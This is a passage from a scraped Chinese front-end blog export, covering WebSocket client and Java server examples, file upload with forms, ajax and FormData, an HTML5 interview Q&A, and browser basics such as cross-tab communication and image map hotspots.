1）服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，能实现真正意义上的推送功能，属于服务器推送技术的一种。异步。 2）建立在 TCP 协议之上，服务器端的实现比较容易。 3）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。 4）数据格式比较轻量，性能开销小，通信高效。 5）可以发送文本，也可以发送二进制数据。 6）没有同源限制，客户端可以与任意服务器通信。 7）协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。 2、客户端API 1）WebSocket WebSocket对象作为一个构造函数，用于新建WebSocket实例： 1var ws = new WebSocket('ws://localhost:8080'); 执行上面语句之后，客户端就会与服务器进行连接。websocket的url开头是ws，如果需要ssl加密可以使用wss。 2）webSocket.readyState readyState属性返回实例对象的当前状态，共有四种： CONNECTING：值为0，表示正在连接。 OPEN：值为1，表示连接成功，可以通信了。 CLOSING：值为2，表示连接正在关闭。 CLOSED：值为3，表示连接已经关闭，或者打开连接失败。 1234567891011121314151617switch (ws.readyState) &#123; case WebSocket.CONNECTING: // do something break; case WebSocket.OPEN: // do something break; case WebSocket.CLOSING: // do something break; case WebSocket.CLOSED: // do something break; default: // this never happens break;&#125; 3）webSocket.onopen 实例对象的onopen属性，用于指定连接成功后的回调函数: 123ws.onopen = function () &#123; ws.send('Hello Server!');&#125; 如果要指定多个回调函数，可以使用addEventListener方法: 123ws.addEventListener('open', function (event) &#123; ws.send('Hello Server!');&#125;); 4）webSocket.onclose 实例对象的onclose属性，用于指定连接关闭后的回调函数： 12345678910111213ws.onclose = function(event) &#123; var code = event.code; var reason = event.reason; var wasClean = event.wasClean; // handle close event&#125;;ws.addEventListener(\"close\", function(event) &#123; var code = event.code; var reason = event.reason; var wasClean = event.wasClean; // handle close event&#125;); 5）webSocket.onmessage 实例对象的onmessage属性，用于指定收到服务器数据后的回调函数： 123456789ws.onmessage = function(event) &#123; var data = event.data; // 处理数据&#125;;ws.addEventListener(&quot;message&quot;, function(event) &#123; var data = event.data; // 处理数据&#125;); 注意，服务器数据可能是文本，也可能是二进制数据（blob对象或Arraybuffer对象）: 12345678910ws.onmessage = function(event)&#123; if(typeof event.data === String) &#123; console.log(\"Received data string\"); &#125; if(event.data instanceof ArrayBuffer)&#123; var buffer = event.data; console.log(\"Received arraybuffer\"); &#125;&#125; 除了动态判断收到的数据类型，也可以使用binaryType属性，显式指定收到的二进制数据类型: 1234567891011/ 收到的是 blob 数据ws.binaryType = \"blob\";ws.onmessage = function(e) &#123; console.log(e.data.size);&#125;;// 收到的是 ArrayBuffer 数据ws.binaryType = \"arraybuffer\";ws.onmessage = function(e) &#123; console.log(e.data.byteLength);&#125;; 6）webSocket.send() 实例对象的send()方法用于向服务器发送数据： 1234567891011121314151617//发送文本ws.send('your message');//发送 Blob 对象var file = document .querySelector('input[type=\"file\"]') .files[0];ws.send(file);//发送 ArrayBuffer 对象// Sending canvas ImageData as ArrayBuffervar img = canvas_context.getImageData(0, 0, 400, 320);var binary = new Uint8Array(img.data.length);for (var i = 0; i &lt; img.data.length; i++) &#123; binary[i] = img.data[i];&#125;ws.send(binary.buffer); 7）webSocket.bufferedAmount 实例对象的bufferedAmount属性，表示还有多少字节的二进制数据没有发送出去。它可以用来判断发送是否结束： 1234567var data = new ArrayBuffer(10000000);socket.send(data);if (socket.bufferedAmount === 0) &#123; // 发送完毕&#125; else &#123; // 发送还没结束&#125; 8）webSocket.onerror 实例对象的onerror属性，用于指定报错时的回调函数： 123456socket.onerror = function(event) &#123; // handle error event&#125;;socket.addEventListener(\"error\", function(event) &#123; // handle error event&#125;); 3、客户端实例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta name=\"viewport\" content=\"width=device-width\" /&gt; &lt;meta charset=\"UTF-8\"/&gt; &lt;title&gt;WebSocket客户端&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;input type=\"button\" id=\"btnConnection\" value=\"连接\" /&gt; &lt;input type=\"button\" id=\"btnClose\" value=\"关闭\" /&gt; &lt;input type=\"button\" id=\"btnSend\" value=\"发送\" /&gt; &lt;/div&gt; &lt;script src=\"js/jquery-1.11.1.min.js\" type=\"text/javascript\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; $(function() &#123; var socket; if(typeof(WebSocket) == \"undefined\") &#123; alert(\"您的浏览器不支持WebSocket\"); return; &#125; $(\"#btnConnection\").click(function() &#123; socket = new WebSocket(\"ws://127.0.0.1:8087/WebSocketServer/ws/张三\"); //连接成功事件 socket.onopen = function() &#123; alert(\"Socket已连接\"); &#125;; //获得消息事件 socket.onmessage = function(msg) &#123; alert(msg.data); &#125;; //连接关闭事件 socket.onclose = function() &#123; alert(\"Socket已关闭\"); &#125;; //发生错误事件 socket.onerror = function() &#123; alert(\"发生了错误\"); &#125; &#125;); $(\"#btnSend\").click(function() &#123; socket.send(\"这是来自客户端的消息\" + location.href + new Date()); &#125;); $(\"#btnClose\").click(function() &#123; socket.close(); &#125;); &#125;); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 4、服务端实例 1234567891011121314151617181920212223242526272829303132333435363738394041package action;import javax.websocket.CloseReason;import javax.websocket.OnClose;import javax.websocket.OnError;import javax.websocket.OnMessage;import javax.websocket.OnOpen;import javax.websocket.Session;import javax.websocket.server.PathParam;import javax.websocket.server.ServerEndpoint;//ws://127.0.0.1:8087/Demo1/ws/张三@ServerEndpoint(&quot;/ws/&#123;user&#125;&quot;)public class WSServer &#123; private String currentUser; //连接打开时执行 @OnOpen public void onOpen(@PathParam(&quot;user&quot;) String user, Session session) &#123; currentUser = user; System.out.println(&quot;Connected ... &quot; + session.getId()); &#125; //收到消息时执行 @OnMessage public String onMessage(String message, Session session) &#123; System.out.println(currentUser + &quot;：&quot; + message); return currentUser + &quot;：&quot; + message; &#125; //连接关闭时执行 @OnClose public void onClose(Session session, CloseReason closeReason) &#123; System.out.println(String.format(&quot;Session %s closed because of %s&quot;, session.getId(), closeReason)); &#125; //连接错误时执行 @OnError public void onError(Throwable t) &#123; t.printStackTrace(); &#125;&#125; 5、结果截图 标注： 参考资料1：https://www.cnblogs.com/best/archive/2016/09/12/5695570.html 参考资料2：http://www.ruanyifeng.com/blog/2017/05/websocket.html","categories":[{"name":"网络协议","slug":"网络协议","permalink":"http://liuxuewen-site.github.io/categories/网络协议/"}],"tags":[{"name":"网络协议","slug":"网络协议","permalink":"http://liuxuewen-site.github.io/tags/网络协议/"}]},{"title":"图片上传","slug":"JS-bs-picUpload","date":"2018-02-05T12:35:40.000Z","updated":"2019-01-25T10:11:05.282Z","comments":true,"path":"2018/02/05/JS-bs-picUpload/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/05/JS-bs-picUpload/","excerpt":"","text":"一、 form表单上传 12345&lt;form action= \"upload_file.plp\" method= \"post\" enctype =\"multipart/form-data\"&gt; &lt;label for=\"file\"&gt;文件名:&lt;/label&gt; &lt;input type=\"file\" name=\"file\" id=\"file\"/&gt;&lt;/p&gt; &lt;input type =\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; 注意： 1）method必须是post。 2）enctype必须是multipart/form-data。 3）enctype 属性规定在发送到服务器之前应该如何对表单数据进行编码。默认地，表单数据会编码为 “application/x-www-form-urlencoded”。HTML表单如何打包数据文件是由enctype这个属性决定的。有以下几种取值： &emsp;&emsp;a、application/x-www-form-urlencoded：编码所有字符，空格被编码为’+’，特殊字符被编码为ASCII十六进制字符。 &emsp;&emsp;b、multipart/form-data：不对字符编码。在使用包含文件上传控件的表单时必须使用该值。 &emsp;&emsp;c、text/plain：空格转换为 “+” 加号，但不对特殊字符编码。 4）传统的form表单提交会导致页面刷新，跳到action，有些情况下我们不希望页面被刷新，这时看下面。 二、 ajax + form + jq.serialize 1234567891011$.ajax(&#123; url : \"http://localhost:8080/STS/rest/user\", type : \"POST\", data : $( '#postForm').serialize(), success : function(data) &#123; $( '#serverResponse').html(data); &#125;, error : function(data) &#123; $( '#serverResponse').html(data.status + \" : \" + data.statusText + \" : \" + data.responseText); &#125; &#125;); 注意： 1）通过jq方法$(‘#postForm’).serialize()可以对form表单进行序列化，从而将form表单中的所有参数传递到服务端。 2）可实现页面无刷新上传，但是其只能传递一般的参数(文本字符串)，上传文件的文件流是无法被序列化并传递的。继续看下面。 三、 ajax + FormData 使用form： 1234567891011121314151617181920212223242526html:&lt;form id= \"uploadForm\"&gt; &lt;p &gt;指定文件名： &lt;input type=\"text\" name=\"filename\" value= \"\"/&gt;&lt;/p &gt; &lt;p &gt;上传文件： &lt;input type=\"file\" name=\"file\"/&gt;&lt;/ p&gt; &lt;input type=\"button\" value=\"上传\" onclick=\"doUpload()\" /&gt; &lt;/form&gt;js(jquery):function doUpload() &#123; var formData = new FormData($( \"#uploadForm\" )[0]); $.ajax(&#123; url: 'http://localhost:8080/cfJAX_RS/rest/file/upload' , type: 'POST', data: formData, async: false, cache: false, contentType: false, processData: false, success: function (returndata) &#123; alert(returndata); &#125;, error: function (returndata) &#123; alert(returndata); &#125; &#125;); &#125; 不使用form： 123456789101112131415161718192021222324252627282930313233html:&lt;div&gt; &lt;input id=\"lefile\" type=\"file\" style=\"display:none\"&gt; &lt;div style=\"display: inline;\"&gt; &lt;input id=\"photoCover\" type=\"text\"&gt; &lt;a class=\"btn\" onclick=\"$('input[id=lefile]').click();\"&gt;选择图片&lt;/a&gt; &lt;a class=\"btn\" id=\"btn\"&gt;上传图片&lt;/a&gt; &lt;/div&gt;&lt;/div&gt;js(jquery):$('input[id=lefile]').change(function() &#123; $('#photoCover').val($(this).val());&#125;);$(\"#changePictureModify\").click(function() &#123; var formData = new FormData(); formData.append(\"img\", $(\"#lefile\")[0].files[0]); $.ajax(&#123; url: 'http://localhost:8080/cfJAX_RS/rest/file/upload' , type: 'POST', data: formData, async: false, cache: false, contentType: false, processData: false, success: function (returndata) &#123; alert(returndata); &#125;, error: function (returndata) &#123; alert(returndata); &#125; &#125;); &#125;) 1）使用jQuery的ajax()方法和XMLHttpRequest Level 2的FormData接口。 2）FormData可以把所有表单元素的name与value组成一个queryString然后将form作为一个参数上传（代码1），或者用append()方法向FormData对象中添加键值对（代码2）上传。均可实现页面无刷新的文件上传效果，FormData最大的优点就是可以异步上传一个二进制文件。 说明：1）关于文件上传，要想实现更复杂的效果，可使用相关插件。2）文件上传一般都是二进制流形式。 标注： 参考资料1：http://yunzhu.iteye.com/blog/2177923","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"HTML5介绍","slug":"HTML5-bs-basic","date":"2018-02-04T14:19:05.000Z","updated":"2019-01-25T10:33:13.710Z","comments":true,"path":"2018/02/04/HTML5-bs-basic/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/04/HTML5-bs-basic/","excerpt":"","text":"一、说说你对HTML5认识? 1）是什么： HTML5指的是包括 HTML 、 CSS 和 JavaScript 在内的一套技术组合。它希望能够减少网页浏览器对于需要插件的丰富性网络应用服务（ Plug-in-Based Rich Internet Application ， RIA ），例如： AdobeFlash 、 Microsoft Silverlight 与 Oracle JavaFX 的需求，并且提供更多能有效加强网络应用的标准集。 HTML5 是 HTML 最新版本， 2014 年 10 月由万维网联盟（ W3C ）完成标准制定。目标是替换 1999 年所制定的 HTML 4.01 和 XHTML 1.0 标准，以期能在互联网应用迅速发展的时候，使网络标准达到匹配当代的网络需求。 2）为什么： HTML4陈旧不能满足日益发展的互联网需要，特别是移动互联网。为了增强浏览器功能 Flash 被广泛使用，但安全与稳定堪忧，不适合在移动端使用（耗电、触摸、不开放）。 HTML5增强了浏览器的原生功能，符合 HTML5 规范的浏览器功能将更加强大，减少了 Web 应用对插件的依赖，让用户体验更好，让开发更加方便，另外 W3C 从推出 HTML4.0 到 5.0 之间共经历了 17 年， HTML 的变化很小，这并不符合一个好产品的演进规则。 3）标注： HTML5 文档类型为：&lt; !doctype html > ；使用 UTF-8 编码：&lt; meta charset=”UTF-8” > 二、HTML5的优点与缺点？ 优点： a、网络标准统一，HTML5本身是由W3C推荐出来的。 b、多设备、跨平台 c、即时更新。 d、提高可用性和改进用户的友好体验； e、有几个新的标签，这将有助于开发人员定义重要的内容； f、可以给站点带来更多的多媒体元素(视频和音频)； g、可以很好的替代Flash和Silverlight； h、涉及到网站的抓取和索引的时候，对于SEO很友好； i、被大量应用于移动应用程序和游戏。 缺点： a、安全：像之前Firefox4的web socket和透明代理的实现存在严重的安全问题，同时web storage、web socket 这样的功能很容易被黑客利用，来盗取用户的信息和资料。 b、技术门槛：HTML5简化开发者工作的同时代表了有许多新的属性和API需要开发者学习，像web worker、web socket、web storage 等新特性，后台甚至浏览器原理的知识，机遇的同时也是巨大的挑战。 c、性能：某些平台上的引擎问题导致HTML5性能低下。 d、完善性：许多特性各浏览器的支持程度也不一样。 e、浏览器兼容性：最大缺点，IE9以下浏览器几乎全军覆没。 三、HTML5有哪些改变（新增、移除等）？ Html5新增了 27 个元素，废弃了 16 个元素。(后来更多) 1）新增元素（如）： &emsp;&emsp;结构性元素（主要负责web上下文结构的定义）： &emsp;&emsp;&emsp;&emsp;section：在 web 页面应用中，该元素也可用于区域的章节描述。 &emsp;&emsp;&emsp;&emsp;header：页面主体上的头部， header 元素往往在一对 body 元素中。 &emsp;&emsp;&emsp;&emsp;footer：页面的底部（页脚），通常会标出网站的相关信息。 &emsp;&emsp;&emsp;&emsp;nav：专门用于菜单导航、链接导航的元素，是 navigator 的缩写。 &emsp;&emsp;&emsp;&emsp;article：用于表现一篇文章的主体内容，一般为文字集中显示的区域。 &emsp;&emsp;级块性元素（主要完成web页面区域的划分，确保内容的有效分割）： &emsp;&emsp;&emsp;&emsp;aside：用于表达注记、贴士、侧栏、摘要、插入的引用等作为补充主体的内容。 &emsp;&emsp;&emsp;&emsp;figure：是对多个元素进行组合并展示的元素，通常与 ficaption 联合使用。 &emsp;&emsp;&emsp;&emsp;code：表示一段代码块。 &emsp;&emsp;&emsp;&emsp;dialog：用于表达人与人间的对话，包含dt和dd两个组合元素，dt表示说话者，dd 表示说话内容。 &emsp;&emsp;行内语义性元素（主要完成web页面具体内容的引用和描述，是丰富内容展示的基础）： &emsp;&emsp;&emsp;&emsp;meter：表示特定范围内的数值，可用于工资、数量、百分比等。 &emsp;&emsp;&emsp;&emsp;time：表示时间值。 &emsp;&emsp;&emsp;&emsp;progress：用来表示进度条，可通过对其 max 、 min 、 step 等属性进行控制，完成对进度的表示和监事。 &emsp;&emsp;&emsp;&emsp;video：视频元素，用于支持和实现视频文件的直接播放，支持缓冲预载和多种视频媒体格式。 &emsp;&emsp;&emsp;&emsp;audio：音频元素，用于支持和实现音频文件的直接播放，支持缓冲预载和多种音频媒体格式。 &emsp;&emsp;交互性元素（主要用于功能性的内容表达，会有一定的内容和数据的关联，是各种事件的基础）： &emsp;&emsp;&emsp;&emsp;details：表示一段具体内容，但内容默认可能不显示，通过某种手段（如单击）与 legend 交互才会显示出来。 &emsp;&emsp;&emsp;&emsp;datagrid：用来控制客户端数据与显示，可以由动态脚本及时更新。 &emsp;&emsp;&emsp;&emsp;menu：主要用于交互菜单（曾被废弃又被重新启用的元素）。 &emsp;&emsp;&emsp;&emsp;command：用来处理命令按钮。 &emsp;&emsp;表单元素： &emsp;&emsp;&emsp;&emsp;datalist：规定输入域的选项列表，通过它包含的option来创建列表，必须要含value值。 &emsp;&emsp;&emsp;&emsp;keygen：一种验证用户的可靠方法，提供公钥和密钥，但兼容性差所以用的不多。 &emsp;&emsp;&emsp;&emsp;output：提供不同类型的输出。 2）废弃元素（如）： &emsp;&emsp;纯表现的元素： &emsp;&emsp;&emsp;&emsp;basefont：默认字体，不设置字体，以此渲染 &emsp;&emsp;&emsp;&emsp;font：字体标签 &emsp;&emsp;&emsp;&emsp;cnter：水平居中 &emsp;&emsp;&emsp;&emsp;u：下划线 &emsp;&emsp;&emsp;&emsp;big：大字体 &emsp;&emsp;&emsp;&emsp;strike：中横线 &emsp;&emsp;&emsp;&emsp;tt：文本等宽 &emsp;&emsp;框架集： &emsp;&emsp;&emsp;&emsp;frameset：框架集。 &emsp;&emsp;&emsp;&emsp;noframes：可为那些不支持框架的浏览器显示文本。noframes 元素位于 frameset 元素内部。 &emsp;&emsp;&emsp;&emsp;frame：定义 frameset 中的一个特定的窗口（框架）。 3）新增API（如）： &emsp;&emsp;媒体API（getUserMedia API）：允许Web应用程序访问摄像头和麦克风而无需使用插件。 &emsp;&emsp;全屏API（Fullscreen API）：允许开发者以编程方式将Web应用程序全屏运行，使Web应用程序更像本地应用程序。 &emsp;&emsp;页面可见性API（Page Visibility API）：用来检测页面对用户的可见性，返回用户当前浏览页面或标签的状态变化。 &emsp;&emsp;电池API（Battery API）：针对移动设备应用程序的API，主要用于检测设备电池信息。 &emsp;&emsp;预加载API（Link Prefetching）：预加载网页内容，为浏览者提供一个平滑的浏览体验。 四、HTML5行内元素有哪些,块级元素有哪些, 空元素有哪些? (1)行内元素 a - 锚点 abbr - 缩写 acronym - 首字 （ abbr代替 ） b - 粗体 ( 不推荐 ) bdo - bidi override big - 大字体 br - 换行 cite - 引用 code - 计算机代码 ( 在引用源码的时候需要 ) dfn - 定义字段 em - 强调 font - 字体设定 ( 不推荐 ) i - 斜体 img - 图片 input - 输入框 kbd - 定义键盘文本 label - 表格标签 q - 短引用 s - 中划线 ( 不推荐 ) samp - 定义范例计算机代码 select - 项目选择 small - 小字体文本 span - 常用内联容器，定义文本内区块 strike - 中划线 strong - 粗体强调 sub - 下标 sup - 上标 textarea - 多行文本输入框 tt - 电传文本 u - 下划线 var - 定义变量 (2)块元素 address - 地址 blockquote - 块引用 center - 举中对齐块 dir - 目录列表 div - 常用块级容易，也是 css layout 的主要标签 dl - 定义列表 fieldset - form控制组 form - 交互表单 h3-大标题 h4 - 副标题 h3 - 3级标题 h4 - 4级标题 h5 - 5级标题 h6 - 6级标题 hr - 水平分隔线 isindex - input prompt menu - 菜单列表 noframes - frames可选内容，（对于不支持 frame 的浏览器显示此区块内容 noscript - ）可选脚本内容（对于不支持 script 的浏览器显示此内容） ol - 排序表单 p - 段落 pre - 格式化文本 table - 表格 ul - 非排序列表 (3)空元素 ( 在 HTML[1] 元素中，没有内容的 HTML 元素被称为空元素 ) br hr input img link meta (4)可变元素 ( 根据上下文语境决定该元素为块元素或者内联元素。) applet - java applet button - 按钮 del - 删除文本 iframe - inline frame ins - 插入的文本 map - 图片区块 (map) object - object对象 script - 客户端脚本 五、谈谈你对canvas的理解？ canvas是HTML5中新增的一个标签，它可以实现网页中动态的2D与3D图像技术。其与SVG及VML之间的区别是，有一个基于JavaScript的绘图API，而SVG和VML使用一个XML文档来描述绘图。SVG绘图容易编辑与生成，但功能明显要弱一些。 canvas可以完成动画、游戏、图表、图像处理等原来需要Flash完成的一些功能。 六、HTML5 存储类型？ HTML5之前，存储是使用cookies的。HTML5后提供了下面两种本地存储方案： 1）localStorage：用于持久化的本地存储，数据永远不会过期，关闭浏览器也不会丢失。 2）sessionStorage：同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。不是一种持久化的本地存储，仅仅是会话级别的存储。 详情请看之前文章。 七、HTML5有哪些媒体标签？ html5除了audio和video标签外，还支持以下标签： &lt; embed > 标签定义嵌入的内容，比如插件: 1&lt;embed type=&quot;video/quicktime&quot; src= &quot;Fishing.mov&quot;&gt; &lt; source > 定义数据源（可多个）: 1234&lt;video width=\"450\" height= \"340\" controls&gt; &lt;source src=\"jamshed.mp4\" type=\"video/mp4\"&gt; &lt;source src=\"jamshed.ogg\" type=\"video/ogg\"&gt;&lt;/video&gt; &lt; track > 标签为诸如video元素之类的媒介规定外部文本轨道,用于规定字幕文件或其他包含文本的文件，当媒介播放时，这些文件是可见的。 123456&lt;video width=” 450 ″ height= ” 340 ″ controls&gt; &lt;source src=” jamshed.mp4 ″ type= ” video/mp4 ″ &gt; &lt;source src=” jamshed.ogg ” type= ” video/ogg ” &gt; &lt;track kind=” subtitles ” label= ” English ” src= ” jamshed_en.vtt ” srclang= ” en ” default&gt;&lt;/track&gt; &lt;track kind=” subtitles ” label= ” Arabic ” src= ” jamshed_ar.vtt ” srclang= ” ar ” &gt;&lt;/track&gt;&lt;/video&gt; 八、HTML5应用程序缓存？ html5之前的网页都是无连接，须联网才能访问，这对于PC问题不大，但到了移动互联网时代，设备终端位置不再固定，依赖无线信号，网络的可靠性降低，比如坐在火车上，过隧道时便无法访问网站，这对于web的伤害是很大的。 HTML5引入了应用程序缓存技术，意味着web应用可进行缓存，并在没有网络的情况下使用，通过创建cache manifest文件，让应用程序可以获取本地的网站内容，例如HTML、CSS、图片以及 JavaScript。可以轻松的创建离线。其优势在： 1）离线浏览 - 用户可在应用离线时使用它们 2）速度 - 已缓存资源加载得更快 3）减少服务器负载 - 浏览器将只从服务器下载更新过或更改过的资源。 html5应用程序缓存与传统浏览器缓存相比，它不强制用户访问的网站内容被缓存。主流浏览器皆支持，IE8 IE9除外。 应用程序缓存的使用要做两方面的工作： 1）浏览器上只需要一个简单的设置即可：&lt; html manifest=”demo.appcache” > 2）服务器端需要维护一个manifest清单,如: 1234567891011121314151617CACHE MANIFESTCACHE:# 需要缓存的列表style1.css1.jpg01.jshttp://localhost/applicationcache/02.jshttp://localhost/applicationcache/zepto.jsNETWORK:# 不需要缓存的4.jpgFALLBACK:# 访问缓存失败后，备用访问的资源，第一个是访问源，第二个是替换文件*.html /offline.html2.jpg/3.jpg 注意： 123456789101112131415161718192021222324252627# 1）manifest 文件可分为三个部分：# CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存# NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存# FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面）# 2）manifest文件需配置正确的MIME-type，即\"text/cache-manifest\"。须在web服务器上配置，不同服务器不一样。# 3）Application Cache的尺寸限制统一在5M，单个文件不要超出这个上限。# 4）如果manifest文件，或者内部列举的某一个文件不能正常下载，整个更新过程都将失败，浏览器继续全部使用老的缓存。# 5）引用manifest的html必须与manifest文件同源。FALLBACK中的资源必须和manifest文件同源。# 6）当一个资源被缓存后，该浏览器直接请求这个绝对路径也会访问缓存中的资源。# 7）站点中的其他页面即使没有设置manifest属性，请求的资源如果在缓存中也从缓存中访问。# 8）当manifest文件发生改变时，资源请求本身也会触发更新。# 9）一旦应用被缓存，它就会保持缓存直到发生下列情况：# 用户清空浏览器缓存# manifest 文件被修改（参阅下面的提示）# 由程序来更新应用缓存# 10）更新机制，首次更新manifest时，因为页面加载已经开始甚至完成，缓存更新尚未完成，# 浏览器仍会使用过期的资源；浏览器是当Application Cache有更新时，# 该次不会使用新资源，第二次才会使用。这个时候在update事件中执行window.reload事件。 这样一来便可以离线应用了，这个时候就算断网了，那些文件依旧能访问。 标注： 本文来自牛客网，第八点改自 https://www.cnblogs.com/yexiaochai/p/4271834.html 及 https://www.jianshu.com/p/a6261263767f","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-HTML5","slug":"前端-HTML5","permalink":"http://liuxuewen-site.github.io/tags/前端-HTML5/"}]},{"title":"前端基础考题3","slug":"frontEnd-basic3","date":"2018-02-03T15:10:57.000Z","updated":"2019-01-25T10:01:58.031Z","comments":true,"path":"2018/02/03/frontEnd-basic3/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/03/frontEnd-basic3/","excerpt":"","text":"一、什么是浏览器的内核？各大浏览器的内核是什么？ 1） 浏览器内核主要分成两部分：渲染引擎(layout engineer或 Rendering Engine) 和 JS 引擎。 渲染引擎：负责取得网页的内容（HTML、 XML 、图像等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核。 JS引擎则：解析和执行 javascript 来实现网页的动态效果。 最开始渲染引擎和JS引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。 2） a、 IE: trident 内核 &emsp;&emsp;b、 Firefox ： gecko 内核 &emsp;&emsp;c、 Safari:webkit 内核 &emsp;&emsp;d、 Opera: 以前是 presto 内核， Opera 现已改用 Google Chrome 的 Blink 内核 &emsp;&emsp;e、 Chrome:Blink( 基于 webkit ， Google 与 Opera Software 共同开发 ) 二、如何实现浏览器内多个标签页之间的通信? 方法一：localstorge localstorge在一个标签页里被添加、修改或删除时，都会触发一个storage事件，通过在另一个标签页里监听storage事件，即可得到localstorge存储的值，实现不同标签页之间的通信。 1234567891011121314151617181920标签1:&lt;input id=\"name\"&gt; &lt;input type=\"button\" id=\"btn\" value=\"提交\"&gt; &lt;script type=\"text/javascript\"&gt; $(function()&#123; $(\"#btn\").click(function()&#123; var name=$(\"#name\").val(); localStorage.setItem(\"name\", name); &#125;); &#125;); &lt;/script&gt;标签2:&lt;script type=\"text/javascript\"&gt; $(function()&#123; window.addEventListener(\"storage\", function(event)&#123; console.log(event.key + \"=\" + event.newValue); &#125;); &#125;); &lt;/script&gt; 方法二：cookie+setInterval 使用cookie+setInterval，将要传递的信息存储在cookie中，每隔一定时间读取cookie信息，即可随时获取要传递的信息。 1234567891011121314151617181920212223标签1:input id=\"name\"&gt; &lt;input type=\"button\" id=\"btn\" value=\"提交\"&gt; &lt;script type=\"text/javascript\"&gt; $(function()&#123; $(\"#btn\").click(function()&#123; var name=$(\"#name\").val(); document.cookie=\"name=\"+name; &#125;); &#125;); &lt;/script&gt; 标签2:&lt;script type=\"text/javascript\"&gt; $(function()&#123; function getCookie(key) &#123; return JSON.parse(\"&#123;\\\"\" + document.cookie.replace(/;\\s+/gim,\"\\\",\\\"\").replace(/=/gim, \"\\\":\\\"\") + \"\\\"&#125;\")[key]; &#125; setInterval(function()&#123; console.log(\"name=\" + getCookie(\"name\")); &#125;, 10000); &#125;); &lt;/script&gt; 三、如何在页面上实现一个圆形的可点击区域？ 方法一：使用css之border-radius 1234567891011html&lt;div id=\"red\" class=\"click-area\" &gt;&lt;/div&gt;css#red &#123; cursor:pointer; background:red; width:100px; height:100px; border-radius:50%; &#125; 方法二：使用js之求一个点在不在圆上的简单算法、获取鼠标坐标等 1234567891011js(下算法自行百度)document.onclick=function(e)&#123; var r=50; //假设圆的半径 为50 var x1=100,y1=100,x2= e.clientX;y2= e.clientY; //假设圆心为（100,100）, var len=Math.abs(Math.sqrt(Math.pow(x2-x1,2)+Math.pow(y2-y1,2))); //计算鼠标点的位置与圆心的距离 if(len&lt;=50)&#123; console.log(\"内\") //在圆内点击弹出相应的信息 &#125;else&#123; console.log(\"外\") //在圆外显示不在圆内的信息 &#125; &#125; 方法三：使用html之map+area 此处详解，请看第三部分。 四、HTML的&lt; area >&lt; map >标签及其在实际开发中的应用？1、&lt; area >&lt; map >的原本作用 &lt; area >&lt; map >原本作用是给&lt; img >图像标记热点区域用的。例如一张中国省份地图，点击对应省份显示对应省份介绍的页面；而且兼容性很好。 示例如下： 123456&lt;img src=\"1.jpg\" alt=\"hello\" usemap=\"#MM\" width=\"256\" height=\"191\"&gt;&lt;map id=\"MM\" name=\"MM\"&gt; &lt;area shape=\"rect\" coords=\"20,20,80,80\" href=\"#rect\" alt=\"矩形\"&gt; &lt;area shape=\"circle\" coords=\"200,50,50\" href=\"#circle\" alt=\"圆形\"&gt; &lt;area shape=\"poly\" coords=\"150,100,200,120,180,130,190,180,150,150,100,160,140,120,100,110\" href=\"#poly\" alt=\"多边形\"&gt;&lt;/map&gt; 此时图片上就有3个热区，我们使用Tab键索引高亮就可以窥见其轮廓范围,如： 图片和热点区域元素关联是使用图片的usemap属性，其值对应&lt; map >的id或者name值（Chrome浏览器只支持name属性值关联）。 &lt; area >出现的几个属性： 1）shape shape表示点击热点区域的形状，支持矩形rect，圆形circle以及多边形poly。 2）coords coords表示点击热点区域形状的坐标。坐标点0,0表示图片的左上角。 矩形rect支持4个数值，为2个坐标，分别是矩形左上角坐标和矩形右下角坐标。例如，coords=”20,20,80,80”生成的就是一个左上角坐标20,20宽高都是60px的矩形区域。 圆形circle支持3个数值，前2个值为圆心坐标，第3个值为圆的半径大小。 多边形poly就更简单了，每两个数值组合表示一个坐标点，依次连线形成的区域就是最终的热点区域。 3）href href和a元素的href是一样的东西，直接跳转地址，或者锚点等。也同样支持target属性和rel属性。也就是说area可以看成是半个a元素。 4）alt alt同img元素的alt，表示热点区域图片的描述信息。 祖先元素&lt; map >在&lt; area >和图片热点关联中是不可缺少的，但是不一定非得直接父子关系。map和area之间再嵌套个div什么的功能也是正常的。 2、&lt; area >&lt; map >的不足 &lt; area >就原本作用来讲，是一个非常有实用价值的属性，例如用于社交站点的图片的人类识别标注功能。 但我们却很少使用&lt; area >元素,因为图片上热点区域的样式根本无法自定义，除了可以显示outline轮廓意外，什么边框背景色都不行，对area进行CSS设置，也仅仅是改变这个标签元素本身的样式，而不是图片上热点点击区域的样式。于是，图片上的标注或者热点，我们常常使用其他标签，如div，或者a标签进行覆盖进行模拟。 也就是说，HTML &lt; area >只能作用于对点击热点没有任何样式要求的场景。考虑到这种场景使用&lt; a >标签模拟也是可以的，进一步压缩了HTML &lt; area >的实用价值。除非是不规则的点击热点，因为这种不规则区域包括IE8这种不支持CSS3的浏览器也是支持的。 3、&lt; area >&lt; map >衍生的作用 &lt; a 